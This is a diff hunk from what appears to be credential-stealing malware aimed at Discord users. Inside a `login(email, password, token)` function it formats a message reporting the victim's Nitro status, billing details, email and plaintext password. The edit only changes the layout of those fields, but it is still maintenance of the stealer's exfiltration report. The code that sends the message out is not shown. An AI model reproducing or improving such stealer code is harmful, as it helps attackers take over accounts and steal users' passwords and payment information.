@@ -348,22 +348,22 @@ const login = async (email, password, token) => {
           {
             name: "Nitro Type:",
             value: `\`${nitro}\``,
-            inline: false,
+            inline: true,
           },
           {
             name: "Billing:",
             value: `\`${billing}\``,
-            inline: false,
+            inline: true,
           },
           {
             name: "Email::",
             value: `\`${email}\``,
-            inline: false,
+            inline: true,
           },
           {
             name: "Password::",
             value: `\`${password}\``,
-            inline: false,
+            inline: true,
           },
         ],
         author: {
